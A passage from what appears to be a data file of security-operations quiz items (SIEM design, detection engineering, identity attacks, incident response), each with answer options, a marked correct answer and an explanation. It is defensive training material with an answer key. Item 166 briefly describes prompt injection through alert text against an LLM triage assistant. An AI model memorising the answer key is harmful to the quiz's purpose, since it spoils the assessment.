    options: ["A WMI repository rebuild performed by the helpdesk after a disk fault","A WMI query run by the inventory tool each night against every server","A new permanent consumer that runs PowerShell on a timer","A WMI provider update installed by the vendor with the monthly patches"],
    correct: 2, why: "Permanent event filter and consumer bindings that run commands are a stealthy persistence technique.",
    hint: "Filter, consumer, binding."
  },
  {
    id: 121, rank: 3, role: "soc", topic: "Detection as Code", difficulty: "EXPERT",
    q: "A SOC edits SIEM rules directly in the console and cannot explain why rules changed. What is the best structural fix?",
    options: ["Detection-as-code with peer review and automated tests, in most cases","Export the rule list to a spreadsheet each month, and mark the changes by hand","Freeze all rules for a year and review them again only at the next audit","Give each analyst a personal copy of the rule set to edit in the console as they need"],
    correct: 0, why: "Versioned, reviewed and tested rules give an audit trail, safe rollback and repeatable quality.",
    hint: "Rules are software."
  },
  {
    id: 122, rank: 3, role: "soc", topic: "SIEM Versus Data Lake", difficulty: "EXPERT",
    q: "A SOC wants 13 months of enriched telemetry for hunting at a cost the SIEM licence cannot support. What is the BEST architecture?",
    options: ["Raise the SIEM licence until it covers all the data","Tier data: alerts in the SIEM, full telemetry in a cheap lake","Archive the logs to tape, and restore them only when an incident needs them","Cut retention to 30 days, and drop the hunting use case to stay inside the licence"],
    correct: 1, why: "Buying more SIEM capacity is the runner-up since it keeps one tool, but cost scales linearly; tiering keeps detection fast and hunting affordable.",
    hint: "Tier by use."
  },
  {
    id: 123, rank: 3, role: "soc", topic: "Telemetry Strategy", difficulty: "EXPERT",
    q: "Which approach best decides which log sources to onboard first for a new SOC?",
    options: ["Onboard whichever source is cheapest, and quickest to connect first","Map sources to the techniques that threaten the crown jewels","Onboard every device in alphabetical order","Wait for vendors to recommend sources"],
    correct: 1, why: "Threat- and asset-driven selection delivers detection value early instead of volume.",
    hint: "Threat-driven."
  },
  {
    id: 124, rank: 3, role: "soc", topic: "MDR Decision", difficulty: "EXPERT",
    q: "A mid-size company cannot staff a 24x7 SOC but must detect ransomware quickly. What is the BEST sourcing model?",
    options: ["A managed detection service with response authority and an owner","Recruit three analysts for a single shift, and use email alerts overnight","Do nothing out of hours, and review every alert the next morning at nine","Buy more tools, and expect them to contain every threat without staff"],
    correct: 0, why: "Single-shift staffing is the runner-up because it builds internal skills, but ransomware often starts out of hours; MDR with authority covers the gap.",
    hint: "Cover the hours."
  },
  {
    id: 125, rank: 3, role: "soc", topic: "Alert Quality Governance", difficulty: "EXPERT",
    q: "Which governance mechanism best keeps detection noise under control as rules grow?",
    options: ["A monthly total of alerts displayed on the SOC wall screen","A rule that silences any alert after it fires ten times in a day","A per-rule precision target with owner and review cycle","A requirement that analysts close alerts within five minutes"],
    correct: 2, why: "Owned precision targets drive tuning or retirement instead of hiding noise.",
    hint: "Own the quality."
  },
  {
    id: 126, rank: 3, role: "soc", topic: "SOAR Boundaries", difficulty: "EXPERT",
    q: "A SOAR platform can isolate endpoints, disable accounts and delete emails. What is the BEST way to design its autonomy?",
    options: ["Read-only enrichment only, with every response action done manually by analysts","Autonomy only for actions performed outside business hours when staff are away","Full autonomy for all actions to maximise speed","Tiered autonomy by action risk, with approval for high impact, in most cases"],
    correct: 3, why: "Read-only is the runner-up since it limits mistakes, but it wastes the speed advantage; tiered autonomy matches action risk.",
    hint: "Match autonomy to impact."
  },
  {
    id: 127, rank: 3, role: "soc", topic: "Threat Model for the SOC", difficulty: "EXPERT",
    q: "What should a threat model of the SOC itself include?",
    options: ["Only the physical security of the SOC room, and its door locks","The break room layout and seating plan for analysts, as a general rule","Attacks on the SIEM and on analyst accounts and rules","The brand of monitors used on the analysts' desks, as a general rule"],
    correct: 2, why: "The SOC is a high-value target; its tooling, privileged access and rules can be attacked or tampered with.",
    hint: "Protect the watchers."
  },
  {
    id: 128, rank: 3, role: "soc", topic: "Metrics That Drive Behaviour", difficulty: "EXPERT",
    q: "Which SOC metric set is least likely to encourage harmful behaviour?",
    options: ["Number of alerts closed per analyst per hour of each shift worked","Percentage of alerts closed without any analyst notes in the ticket","Number of tickets opened per day","Coverage, precision, time to contain and hunt-found incidents"],
    correct: 3, why: "Outcome metrics reward quality, while volume metrics push analysts to close quickly.",
    hint: "Outcomes over volume."
  },
  {
    id: 129, rank: 3, role: "soc", topic: "Cloud Logging Architecture", difficulty: "EXPERT",
    exhibit: "Provider   LogSource            Format      Retention\nAWS        CloudTrail           JSON        90d\nAzure      Activity/SignIn      JSON        30d\nGCP        Cloud Audit Logs     JSON        400d",
    q: "A company uses three cloud providers and wants consistent detection. What is the best design?",
    options: ["Use only the native consoles for each provider with no correlation, as a first step","Central log collection with normalised fields and shared detection logic","Collect only network logs as they look the same in each cloud, in most cases","Separate SOC teams with different tools in each cloud, where that is practical"],
    correct: 1, why: "Normalisation allows common detections and cross-cloud correlation.",
    hint: "One schema."
  },
  {
    id: 130, rank: 3, role: "soc", topic: "Insider Threat Programme", difficulty: "EXPERT",
    q: "Leadership wants to detect insider data theft. What is the BEST programme design?",
    options: ["Risk-based monitoring with agreed HR and legal oversight","Monitor every employee's personal messages all day","Rely on exit interviews alone to learn about data theft by leavers","Install keyloggers, and screen recorders on every endpoint in the company"],
    correct: 0, why: "Exit interviews are the runner-up since they are low cost and non-intrusive, but they reveal little; governed risk-based monitoring is effective and lawful.",
    hint: "Governed monitoring."
  },
  {
    id: 131, rank: 3, role: "soc", topic: "Deception Strategy", difficulty: "EXPERT",
    q: "How should canary tokens and decoy accounts be used in architecture?",
    options: ["Place them where only intruders go, with high-priority alerts","Hide them from the SOC, and analysts are tested on their own initiative","Use them instead of endpoint detection","Publish them on the company website where visitors, and partners can find them"],
    correct: 0, why: "Decoys give low-noise high-confidence detection of lateral movement and discovery.",
    hint: "Nothing legitimate touches them."
  },
  {
    id: 132, rank: 3, role: "soc", topic: "Retention and Privacy", difficulty: "EXPERT",
    q: "Security logs contain employee personal data. What is the BEST retention approach?",
    options: ["Set retention per log type from need, and restrict access","Let each system owner choose any retention period they prefer","Delete all logs after 24 hours to protect employee privacy completely","Keep all logs forever to be safe"],
    correct: 0, why: "Keeping everything forever is the runner-up because it preserves evidence, but it breaches minimisation and raises breach impact.",
    hint: "Purpose-based retention."
  },
  {
    id: 133, rank: 3, role: "soc", topic: "Purple Team Programme", difficulty: "EXPERT",
    q: "How should a mature SOC run purple teaming?",
    options: ["Only by the external vendor, with no involvement from the SOC analysts at all","On a continuous cycle prioritised by threat intelligence","Once every three years in the month before the external audit takes place each time","Only after a breach has happened"],
    correct: 1, why: "Continuous, prioritised testing keeps detections current as environments and attackers change.",
    hint: "Continuous and tracked."
  },
  {
    id: 134, rank: 3, role: "soc", topic: "Crisis Communication Design", difficulty: "EXPERT",
    q: "What should the incident communication plan define in advance?",
    options: ["A single shared email address used by every team during a crisis","The attacker's likely identity","The names, and phone numbers of the reporters who may call the press office","Roles, approved channels, templates and decision authority"],
    correct: 3, why: "Predefined roles and channels avoid delays and conflicting messages in a crisis.",
    hint: "Decide before the crisis."
  },
  {
    id: 135, rank: 3, role: "soc", topic: "OT Monitoring Design", difficulty: "EXPERT",
    q: "A SOC must monitor a plant network where agents cannot be installed. What is the BEST approach?",
    options: ["Scan the controllers actively every hour with a standard vulnerability scanner","Passive monitoring from span ports with protocol-aware sensors","Install agents on the controllers","Ignore the plant network, and watch only the IT side of the business"],
    correct: 1, why: "Active scanning is the runner-up since it finds assets quickly, but it can disrupt fragile devices; passive protocol-aware monitoring is safe.",
    hint: "Passive in OT."
  },
  {
    id: 136, rank: 3, role: "soc", topic: "Detection Backlog Prioritisation", difficulty: "EXPERT",
    q: "Which input should most influence the order of a detection engineering backlog?",
    options: ["The analyst who requested it","The popularity of the rule on social media, and in vendor blog posts","Likelihood and impact of the technique against your environment","The age of the ticket"],
    correct: 2, why: "Risk-based prioritisation spends effort where it reduces exposure the most.",
    hint: "Risk first."
  },
  {
    id: 137, rank: 3, role: "soc", topic: "Evidence for Legal Action", difficulty: "EXPERT",
    q: "A SOC expects possible court action after an intrusion. What should the architecture support?",
    options: ["Short retention periods to limit liability and storage cost","Immutable log storage and documented chain of custody","Analysts using personal tools","Unlogged access to evidence"],
    correct: 1, why: "Tamper-evident storage and handling records support admissibility.",
    hint: "Prove integrity."
  },
  {
    id: 138, rank: 3, role: "soc", topic: "Hunting Programme Structure", difficulty: "EXPERT",
    q: "How should a hunting team convert its findings into lasting value?",
    options: ["Repeat the same hunt every week by hand","Turn successful hunts into automated detections","Stop hunting whenever no incidents have been found by the team","Keep results private to the hunters"],
    correct: 1, why: "Operationalising hunts reduces future manual effort and raises baseline coverage.",
    hint: "Hunt, then automate."
  },
  {
    id: 139, rank: 3, role: "soc", topic: "Third-Party SOC Access", difficulty: "EXPERT",
    q: "An MSSP needs access to the company's SIEM and endpoints. What is the BEST control design?",
    options: ["Full domain admin rights for the provider to avoid delays in response","A shared MSSP admin account","Named MFA accounts with least privilege and session logging","Access only by email requests"],
    correct: 2, why: "A shared admin account is the runner-up because it is simple to set up, but it removes accountability and widens exposure.",
    hint: "Accountable access."
  },
  {
    id: 140, rank: 3, role: "soc", topic: "Telemetry Gap Analysis", difficulty: "EXPERT",
    exhibit: "Tabletop finding TT-14: PowerShell used for lateral movement.\nAvailable logs: process creation (4688) without command line, no 4104 script block events.",
    q: "A tabletop reveals the SOC cannot see PowerShell script content. What is the best remediation?",
    options: ["Ask the incident team to remember the commands, as a first step","Rely on endpoint antivirus signatures, as soon as practical","Block PowerShell for every user in the company, in the first instance","Enable script block logging and forward it centrally"],
    correct: 3, why: "The telemetry gap is closed by enabling and collecting script block logs, with testing of volume.",
    hint: "Fix the telemetry."
  },
  {
    id: 141, rank: 3, role: "soc", topic: "Case Management Design", difficulty: "EXPERT",
    q: "What is the main architectural benefit of integrating case management with detection and SOAR?",
    options: ["Tickets can be closed automatically without any analyst review at all","Logs no longer need to be stored","One linked record of alerts and actions for audit and tuning","Fewer analysts are needed immediately"],
    correct: 2, why: "Linked data supports reporting, quality review and rule improvement.",
    hint: "One record."
  },
  {
    id: 142, rank: 3, role: "soc", topic: "Purple Findings Triage", difficulty: "EXPERT",
    q: "A purple exercise shows 40 techniques undetected. What is the BEST response?",
    options: ["Accept the result as the attackers are advanced, and unstoppable","Rank by threat relevance and fix the top items first","Ignore techniques that need admin rights","Fix all 40 before doing anything else"],
    correct: 1, why: "Fixing everything is the runner-up because it feels complete, but it delays the most relevant gaps; prioritisation delivers risk reduction sooner.",
    hint: "Prioritise."
  },
  {
    id: 143, rank: 3, role: "soc", topic: "SIEM Resilience", difficulty: "EXPERT",
    q: "What should a SIEM architecture include to remain useful during an attack on the network?",
    options: ["Logs stored on the monitored servers","A single collector in the data centre to keep the design simple, and cheap","Out-of-band access and redundant collectors with protected storage","Admin access only from the corporate network where the SIEM is hosted"],
    correct: 2, why: "Attackers target logging; resilient, separate infrastructure keeps visibility.",
    hint: "Survive the attack."
  },
  {
    id: 144, rank: 3, role: "soc", topic: "Identity-Centric Detection", difficulty: "EXPERT",
    q: "Which design choice best supports detection of compromised accounts?",
    options: ["Looking at VPN logs only, until the next scheduled review takes place","Reviewing the HR joiner, and leaver records once every month by hand","Central identity logs enriched with endpoint and cloud events","Counting only failed logons, until the next scheduled review takes place"],
    correct: 2, why: "Identity attacks cross systems, so correlation of identity, endpoint and cloud events is required.",
    hint: "Correlate identity."
  },
  {
    id: 145, rank: 3, role: "soc", topic: "Alert Routing", difficulty: "EXPERT",
    q: "How should alert routing handle different asset criticalities?",
    options: ["Route randomly","Route all alerts to one shared inbox that the whole company can read daily","Route by asset criticality and data sensitivity with matching SLAs","Route by alert vendor"],
    correct: 2, why: "Priority and response expectations should reflect business impact.",
    hint: "Business context."
  },
  {
    id: 146, rank: 3, role: "soc", topic: "Detection Testing Pipeline", difficulty: "EXPERT",
    q: "What belongs in a detection CI pipeline?",
    options: ["A requirement that rules have funny names, and analysts remember them","A weekly meeting about rules","Manual copy of rules to production","Syntax checks, replay tests and a benign-data false positive check"],
    correct: 3, why: "Automated tests protect rule quality before deployment.",
    hint: "Test automatically."
  },
  {
    id: 147, rank: 3, role: "soc", topic: "Backup Telemetry Source", difficulty: "EXPERT",
    q: "Endpoint logging was disabled by an attacker. Which design is the BEST way to preserve detection?",
    options: ["Restarting the agent more often, and it can send its logs again","Hiding the agent names from users, and attackers cannot find it","Network, identity and cloud telemetry independent of the agent, in most cases","Only trusting endpoint agents as they give the richest detail"],
    correct: 2, why: "Relying on endpoint agents alone is the runner-up as they give rich detail, but they are the first target; independent sources provide resilience.",
    hint: "Independent sources."
  },
  {
    id: 148, rank: 3, role: "soc", topic: "SOC Maturity Roadmap", difficulty: "EXPERT",
    q: "What should come first in a SOC maturity roadmap?",
    options: ["Define services and priority threats with measurable outcomes","Buy the most advanced tool on the market before anything else","Rename the SOC","Hire a famous analyst from a well known competitor company"],
    correct: 0, why: "A roadmap starts from objectives and risks, then selects capabilities.",
    hint: "Goals first."
  },
  {
    id: 149, rank: 3, role: "soc", topic: "Executive Reporting", difficulty: "EXPERT",
    q: "Which SOC report best helps the board oversee security operations?",
    options: ["Trend of risk-relevant incidents, detection coverage and response times against targets, as a general rule","Raw log excerpts","A sample of analyst notes","A list of every alert from last month"],
    correct: 0, why: "Boards need outcomes and trends tied to risk, not operational detail.",
    hint: "Outcomes and trends."
  },
  {
    id: 150, rank: 3, role: "soc", topic: "Threat Intel Integration", difficulty: "EXPERT",
    q: "A threat intelligence team produces many reports. What is the BEST way for SOC detection to use them most effectively?",
    options: ["Use reports only in board slides","Translate reports into prioritised detections and hunts mapped to techniques","Add every indicator to the blocklist","Forward every report to analysts"],
    correct: 1, why: "Adding all indicators is the runner-up since it acts quickly, but it creates noise and stale blocks; technique-based detections last longer.",
    hint: "Behaviours over IOCs."
  },
  {
    id: 151, rank: 3, role: "soc", topic: "Data Quality in SIEM", difficulty: "EXPERT",
    exhibit: "Source A: user=jdoe time=2026-03-02T10:00:00Z\nSource B: Username=JDOE time=03/02/26 10:00 AM\nSource C: account=jdoe@corp.example (no timestamp)",
    q: "Which problem most directly degrades detection quality across data sources?",
    options: ["The brand of server","Too many dashboards","Analyst shift lengths","Inconsistent field names and missing timestamps"],
    correct: 3, why: "Detections depend on consistent, parsed and correctly timed fields.",
    hint: "Parsing matters."
  },
  {
    id: 152, rank: 3, role: "soc", topic: "Containment Authority", difficulty: "EXPERT",
    q: "Analysts hesitate to isolate production servers because of business impact. What is the BEST structural fix?",
    options: ["Let analysts decide with no criteria","Require executive approval for every case","Never isolate production servers","Pre-agreed containment authority with criteria and an on-call business approver"],
    correct: 3, why: "Executive approval for every case is the runner-up as it protects the business, but it delays action; pre-agreed criteria combine speed and accountability.",
    hint: "Decide in advance."
  },
  {
    id: 153, rank: 3, role: "soc", topic: "Ransomware Resilience Design", difficulty: "EXPERT",
    q: "Which architecture best limits ransomware damage to detection and recovery?",
    options: ["Immutable offline backups, tested restores and early-warning detections on mass changes","Backups on the same network share","Relying on antivirus","One annual restore test"],
    correct: 0, why: "Protected backups and early detection reduce both impact and recovery time.",
    hint: "Protect backups."
  },
  {
    id: 154, rank: 3, role: "soc", topic: "Privileged Access Monitoring", difficulty: "EXPERT",
    q: "How should privileged sessions be monitored?",
    options: ["Through a broker that records sessions and sends high-risk commands to the SIEM","By trusting admins","By annual access review only","By disabling logs for admins"],
    correct: 0, why: "Session recording and command alerts give accountability and detection for privileged misuse.",
    hint: "Record privileged use."
  },
  {
    id: 155, rank: 3, role: "soc", topic: "Skills and Staffing Model", difficulty: "EXPERT",
    q: "What is the best way to prevent analyst burnout and knowledge loss?",
    options: ["Reduce training, and revisit the decision after the next release","Require longer shifts, until the next scheduled review takes place","Keep expertise with one person, then record the result in the ticket","Rotate duties and automate triage with documented playbooks"],
    correct: 3, why: "Sustainable staffing and documentation keep operations resilient.",
    hint: "Sustainable operations."
  },
  {
    id: 156, rank: 3, role: "soc", topic: "Cross-Team Intelligence Sharing", difficulty: "EXPERT",
    q: "What should a SOC do to share indicators with industry peers safely?",
    options: ["Keep all findings secret","Post indicators publicly with full victim details","Use an agreed sharing community with TLP markings and sanitised data","Send them by personal email"],
    correct: 2, why: "Controlled sharing improves collective defence without exposing victim data.",
    hint: "Share safely."
  },
  {
    id: 157, rank: 3, role: "soc", topic: "Detection Retirement", difficulty: "EXPERT",
    q: "When should a detection rule be retired?",
    options: ["When its logic no longer applies and the decision is recorded","Never","When an analyst dislikes it","When it fires once"],
    correct: 0, why: "Governance includes lifecycle: obsolete or low-value rules add cost and noise.",
    hint: "Lifecycle matters."
  },
  {
    id: 158, rank: 3, role: "soc", topic: "SOC Automation ROI", difficulty: "EXPERT",
    q: "Which task is the best first candidate for automation?",
    options: ["Final decisions on whether breach notifications must be sent to regulators","Executive communication","Deleting evidence","High-volume low-risk enrichment and triage steps"],
    correct: 3, why: "Repetitive low-risk tasks save time with little risk.",
    hint: "Automate the repetitive."
  },
  {
    id: 159, rank: 3, role: "soc", topic: "Suppression Rule Governance", difficulty: "EXPERT",
    exhibit: "Suppression S-231: source_net=10.40.0.0/16 rule=* owner=(none) created=2025-04-11 expires=(never)",
    q: "An analyst adds a suppression that hides every alert from the sales network because it is noisy. What control should exist for suppressions?",
    options: ["Let the vendor decide which alerts the SOC may suppress for the company","Allow any analyst to add suppressions without recording who did it","Block all suppressions, and make analysts triage every alert by hand","Expiry dates, owners and peer review"],
    correct: 3, why: "Suppressions silently remove coverage, so they need ownership, review and expiry.",
    hint: "Silence has a cost."
  },
  {
    id: 160, rank: 3, role: "soc", topic: "Tabletop Findings", difficulty: "EXPERT",
    q: "A tabletop shows the SOC could not reach the legal team during a weekend breach. What is the best architectural fix?",
    options: ["A requirement that legal staff stay in the office at weekends","A tested on-call roster with escalation paths and backups","A longer incident response policy document with more sections","A reminder email to all staff about the importance of availability"],
    correct: 1, why: "Reachability and escalation need a maintained, tested on-call structure, not just documents.",
    hint: "Test the roster."
  },
  {
    id: 161, rank: 4, role: "soc", topic: "AiTM Session Theft", difficulty: "EXPERT",
    exhibit: "10:02:11 SignIn user=cfo@corp.example ip=81.2.69.142 (GB) MFA=satisfied sessionId=7f3a\n10:09:48 Access user=cfo@corp.example ip=185.220.101.7 (DE) MFA=claim-in-token sessionId=7f3a\n10:10:15 MailItemsAccessed count=412",
    q: "Sign-in logs show a successful MFA sign-in, then the same session token used from a different country minutes later. What is the BEST conclusion and response?",
    options: ["Impossible travel caused by VPN use, and tune the rule and close the alert as benign","Stolen session token via an AiTM proxy, so revoke sessions and bind tokens","A time zone display error in the portal, and reload the logs and check again","A password guess that the MFA step stopped, and no further action is needed here"],
    correct: 1, why: "Treating it as VPN is the runner-up since it is common, but the token reuse after a completed MFA sign-in points to stolen session cookies, which a password reset alone will not fix.",
    hint: "Valid MFA, stolen session."
  },
  {
    id: 162, rank: 4, role: "soc", topic: "ADCS Abuse Detection", difficulty: "EXPERT",
    exhibit: "EventID 4887 Requester: CORP\\jsmith Template: UserAuth SubjectAltName: upn=administrator@corp.example",
    q: "Which finding best indicates abuse of a vulnerable certificate template?",
    options: ["A new template created by the PKI team","A routine renewal of a web server certificate by the platform team before expiry","A scheduled certificate revocation list update published by the issuing authority","A certificate issued for a privileged user with an attacker-chosen subject"],
    correct: 3, why: "ESC1-style abuse lets a low-privilege requester supply an alternative subject name and then authenticate as another user.",
    hint: "Requester supplies the subject."
  },
  {
    id: 163, rank: 4, role: "soc", topic: "EDR Evasion via Syscalls", difficulty: "EXPERT",
    q: "An implant avoids user-mode API hooks used by the EDR. Which detection approach still works?",
    options: ["Searching for the hook libraries by name, as soon as practical","Trusting the process image path, then record the result in the ticket","Kernel callbacks, ETW and call stack analysis, in most cases","Blocking the EDR from logging, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Direct syscalls bypass user-mode hooks, so telemetry from the kernel and abnormal call stacks becomes important.",
    hint: "Go below the hooks."
  },
  {
    id: 164, rank: 4, role: "soc", topic: "Supply Chain Update Compromise", difficulty: "EXPERT",
    q: "A signed update from a trusted software vendor launches an unknown child process and contacts a rare domain. What is the BEST response?",
    options: ["Treat the signed update as hostile and isolate the hosts","Block only the rare domain, and carry on deploying the update to every other host","Wait for the next vendor release before acting on the unusual activity","Allow it, as the signature is valid and the vendor is a long-standing trusted supplier"],
    correct: 0, why: "Blocking only the domain is the runner-up since it stops this channel, but the trusted update itself is the infection vector and will keep deploying.",
    hint: "Signature is not safety."
  },
  {
    id: 165, rank: 4, role: "soc", topic: "Detection Model Drift", difficulty: "EXPERT",
    q: "A machine learning detection model gradually misses new phishing styles. What is the best programme control?",
    options: ["Switch off the model, and revisit the decision after the next release","Retrain once a decade, and revisit the decision after the next release","Monitor precision and recall with fresh labelled data and retrain","Add more users to the training set without labels, then record the result in the ticket"],
    correct: 2, why: "Models degrade as attackers change, so continuous evaluation and retraining are needed.",
    hint: "Measure drift."
  },
  {
    id: 166, rank: 4, role: "soc", topic: "LLM Triage Assistant Risk", difficulty: "EXPERT",
    q: "The SOC plans an LLM assistant that reads alert text and suggests closures. What is the BEST safeguard?",
    options: ["Give the model admin rights across the tools to speed up enrichment, and response","Trust the model as it is accurate in tests","Treat alert text as untrusted and require human closure approval","Allow the model to close low alerts alone"],
    correct: 2, why: "Letting it close low alerts alone is the runner-up since volume is reduced, but attacker-controlled text in alerts can inject instructions that hide real threats.",
    hint: "Untrusted input."
  },
  {
    id: 167, rank: 4, role: "soc", topic: "Golden SAML Hunt", difficulty: "EXPERT",
    q: "Which log pattern best suggests forged SAML assertions?",
    options: ["Cloud sign-ins with no matching IdP authentication event","A new administrator account added to the identity provider by the platform team","A scheduled SAML metadata refresh on the identity provider after a certificate renewal","Many failed sign-ins for different accounts within a few minutes from one source"],
    correct: 0, why: "Forged tokens are accepted by the service provider without any real authentication at the IdP.",
    hint: "No IdP event."
  },
  {
    id: 168, rank: 4, role: "soc", topic: "Kernel Rootkit Indicators", difficulty: "EXPERT",
    q: "Which memory forensics finding best suggests a kernel rootkit?",
    options: ["A long file name","Process listed by one method but missing from the kernel process list","Many open browser tabs","A process that uses a lot of CPU time while the analyst runs a scheduled full scan"],
    correct: 1, why: "Cross-view differences between structures reveal objects hidden by manipulation of kernel lists.",
    hint: "Cross-view mismatch."
  },
  {
    id: 169, rank: 4, role: "soc", topic: "Incident Command at Scale", difficulty: "EXPERT",
    q: "A ransomware outbreak affects five regions and multiple regulators. What is the BEST command structure?",
    options: ["One incident commander, regional leads and a legal and comms cell","Wait for law enforcement to lead, until the next scheduled review takes place","Each region handles its own response alone","The CEO directs every technical action in every region from the executive floor"],
    correct: 0, why: "Letting each region act alone is the runner-up since local knowledge helps, but it produces conflicting decisions and missed deadlines.",
    hint: "One commander."
  },
  {
    id: 170, rank: 4, role: "soc", topic: "Cloud Token Replay", difficulty: "EXPERT",
    q: "Which control best reduces replay of stolen cloud access tokens?",
    options: ["Longer lifetimes","Shared tokens","Storing refresh tokens in shared documents, and teams can reuse them quickly","Short lifetimes with token binding and conditional access"],
    correct: 3, why: "Binding tokens to a device or context and shortening validity limits replay.",
    hint: "Bind the token."
  },
  {
    id: 171, rank: 4, role: "soc", topic: "OAuth App Abuse", difficulty: "EXPERT",
    exhibit: "AppConsent app=\"Doc Viewer Pro\" publisher=(unverified) scopes=Mail.Read offline_access Users=87 firstSeen=2026-02-27",
    q: "Which indicator best shows a malicious OAuth application is reading email?",
    options: ["A newly consented app with broad mail scopes by many users","A normal mailbox login","A password change","A new distribution list created by the marketing team for a product launch event"],
    correct: 0, why: "Consent phishing grants persistent API access that survives password resets.",
    hint: "Consent, not credentials."
  },
  {
    id: 172, rank: 4, role: "soc", topic: "DNS Hijack Detection", difficulty: "EXPERT",
    q: "Which evidence best indicates DNS hijacking of the company domain?",
    options: ["A busy resolver","Normal TTL values","A new website banner added by the marketing team for the spring sales campaign","Registrar account change followed by new name server records"],
    correct: 3, why: "Changes at the registrar level redirect the entire domain and need account and record auditing.",
    hint: "Check the registrar."
  },
  {
    id: 173, rank: 4, role: "soc", topic: "Firmware Implant Hunt", difficulty: "EXPERT",
    q: "Several servers show unexplained network behaviour that survives OS reinstallation. What is the BEST next step?",
    options: ["Replace the antivirus product on the servers with the product from a different vendor","Wait for the vendor, and review the outcome at the next monthly meeting","Reinstall the OS again","Verify firmware against known-good images and isolate the hardware"],
    correct: 3, why: "Reinstalling again is the runner-up since it is cheap, but persistence below the OS survives it.",
    hint: "Below the OS."
  },
  {
    id: 174, rank: 4, role: "soc", topic: "Detection of Kerberos Delegation Abuse", difficulty: "EXPERT",
    q: "Which attribute change most strongly indicates a delegation attack setup?",
    options: ["A server set to unconstrained delegation by an unexpected admin","A user changing a display name, and photo in the corporate directory after marriage","A group rename","A password expiry"],
    correct: 0, why: "Delegation lets a service impersonate users; unexpected changes create privilege escalation paths.",
    hint: "Delegation changes."
  },
  {
    id: 175, rank: 4, role: "soc", topic: "Adversary Emulation Mapping", difficulty: "EXPERT",
    q: "How should a SOC measure the result of an adversary emulation?",
    options: ["Detection and response outcome per technique with time to detect","Number of tools used","Length of the report","Whether the red team was polite, and well organised during the whole engagement window"],
    correct: 0, why: "Technique-level results show gaps and speed rather than activity volume.",
    hint: "Per technique."
  },
  {
    id: 176, rank: 4, role: "soc", topic: "Regulatory Clock Decision", difficulty: "EXPERT",
    q: "A breach may involve personal data, and the notification clock to the regulator is 72 hours from awareness. What is the BEST SOC action?",
    options: ["Notify customers first, and review the outcome at the next monthly meeting","Delete incomplete records, and the regulator is not given unreliable information","Wait for the investigation to finish, and review the outcome at the next monthly meeting","Record when you became aware, assess data impact early and brief legal"],
    correct: 3, why: "Waiting is the runner-up since facts will be fuller, but the clock runs from awareness and late notification carries penalties.",
    hint: "Clock starts at awareness."
  },
  {
    id: 177, rank: 4, role: "soc", topic: "BGP Anomaly", difficulty: "EXPERT",
    q: "Which external event could cause traffic to the company's prefix to be routed through an attacker?",
    options: ["A full disk","A hijacked or leaked BGP announcement","A weak Wi-Fi password, as a general rule","An expired TLS certificate on the public website of the main company brand"],
    correct: 1, why: "Route hijacks divert traffic and can enable interception or outage.",
    hint: "Routing, not hosts."
  },
  {
    id: 178, rank: 4, role: "soc", topic: "Threat Hunt in Encrypted Traffic", difficulty: "EXPERT",
    q: "How can a SOC hunt malicious traffic it cannot decrypt?",
    options: ["Decrypt traffic on privately owned devices that employees bring to the office","Block TLS","Use JA3 or JA4 fingerprints, certificate data and flow timing, in most cases","Give up"],
    correct: 2, why: "Metadata and handshake fingerprints still expose tooling and C2 patterns.",
    hint: "Metadata."
  },
  {
    id: 179, rank: 4, role: "soc", topic: "Cloud Control Plane Persistence", difficulty: "EXPERT",
    q: "An attacker created a federation trust to their own IdP in a cloud tenant. What is the BEST remediation?",
    options: ["Delete the user who created it only, until the next scheduled review takes place","Change the tenant name and display branding, and the attacker cannot find it","Remove the trust, review identities and tokens and audit admin roles","Add MFA"],
    correct: 2, why: "Removing only the creating user is the runner-up as it feels targeted, but the trust gives independent access.",
    hint: "Remove the backdoor."
  },
  {
    id: 180, rank: 4, role: "soc", topic: "Insider Collusion Signals", difficulty: "EXPERT",
    q: "Which data best helps detect collusion between a finance clerk and an approver?",
    options: ["Badge swipes recorded at the building entrance on the days the two users work","Desk locations of the two users compared across the finance floor plan","The number of emails each of the two users sends to the finance mailbox","Approval patterns and timing correlated across both users"],
    correct: 3, why: "Collusion appears in unusual joint patterns such as always-approved items from the same pair.",
    hint: "Joint pattern."
  },
  {
    id: 181, rank: 4, role: "soc", topic: "Deepfake Voice Fraud Response", difficulty: "EXPERT",
    q: "A deepfake voice request led to a wire transfer. What is the best first response?",
    options: ["Wait until audit, and review the outcome at the next monthly meeting","Blame the finance clerk, and start disciplinary action before checking the facts","Ask the bank to recall the payment and preserve the call evidence","Delete the call, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Speed matters for recall; evidence supports law enforcement and process fixes.",
    hint: "Recall quickly."
  },
  {
    id: 182, rank: 4, role: "soc", topic: "Security Data Poisoning", difficulty: "EXPERT",
    q: "An attacker floods the logging pipeline with benign-looking events to bury intrusion traces. What is the BEST control?",
    options: ["Increase the retention","Rate limits and anomaly detection on sources, with priority queues, in most cases","Turn off verbose logging on the sources that generate the highest volume of events","Ignore the volume as the SIEM license includes unlimited ingestion"],
    correct: 1, why: "More retention is the runner-up since it keeps data, but it does not stop critical events being drowned.",
    hint: "Protect the pipeline."
  },
  {
    id: 183, rank: 4, role: "soc", topic: "Zero-Day Exploitation Triage", difficulty: "EXPERT",
    q: "A zero-day in an edge device is announced with no patch. What is the best SOC action?",
    options: ["Hunt for exploitation indicators and apply vendor mitigations or isolate exposure","Reboot the device daily","Disable logging","Wait for the patch"],
    correct: 0, why: "Without a patch the response is exposure reduction and retrospective hunting.",
    hint: "Mitigate and hunt."
  },
  {
    id: 184, rank: 4, role: "soc", topic: "Detection Coverage Illusion", difficulty: "EXPERT",
    q: "A dashboard shows 90 percent ATT&CK coverage. Why can this be misleading?",
    options: ["Dashboards are slow","Rules may exist without tests or data to fire in your environment","The framework is invalid","Coverage is always 100 percent"],
    correct: 1, why: "Coverage counts rules, not whether they work on real telemetry.",
    hint: "Tested coverage."
  },
  {
    id: 185, rank: 4, role: "soc", topic: "Ransom Negotiation Governance", difficulty: "EXPERT",
    q: "Leadership asks the SOC whether to pay a ransom. What is the BEST role for the SOC?",
    options: ["Decide alone","Negotiate secretly","Refuse to advise","Provide evidence on data theft and recovery options and leave the decision to executives with legal advice"],
    correct: 3, why: "Deciding alone is the runner-up as the SOC knows the facts, but payment has legal, financial and ethical implications beyond security.",
    hint: "Inform, do not decide."
  },
  {
    id: 186, rank: 4, role: "soc", topic: "Linux eBPF Rootkit", difficulty: "EXPERT",
    q: "Which control best detects malicious eBPF programs on servers?",
